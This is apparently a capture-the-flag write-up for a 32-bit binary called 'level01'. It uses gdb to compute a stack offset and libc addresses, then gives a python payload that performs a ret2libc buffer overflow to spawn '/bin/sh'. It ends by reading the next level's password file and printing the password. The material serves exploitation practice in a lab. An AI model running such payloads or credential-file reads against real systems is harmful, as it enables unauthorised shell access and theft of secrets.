Program behavior:
1. Reads from stdin to a buffer (a_user_name) using `fgets` function;
2. Checks the buffer to be equal with string "dat_wil".
3. Reads from stdin to a buffer (a_user_pass) using `fgets` function;
4. Checks the buffer to be equal with string "admin".

Solution:
Overflow a buffer (a_user_pass) to perform ret2libc attack.

# Launch the debugger
gdb level01
# Run the debugged program
start
# Disassemble main function
disassemble main
`0x080484d8 <+8>:     sub    $0x60,%esp`
`0x0804856d <+157>:   lea    0x1c(%esp),%eax`
# Run the debugged program
start
# Calculate the offset
print/d ($ebp + 4) - ($esp - 0x60 + 0x1c)
`$10 = 80`
# Get address of system function
print/a &system
`$1 = 0xf7e6aed0 <system>`
# Get address of exit function
print/a &exit
`$2 = 0xf7e5eb70 <exit>`
# Get address of "/bin/sh" string
info proc mappings
`0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so`
find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
`0xf7f897ec`
# Quit the debugger
quit
# Initiate ret2libc attack
(python -c 'print "dat_wil\n" + "B" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level01
# Check the flag
cat /home/users/level02/.pass
`PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv`
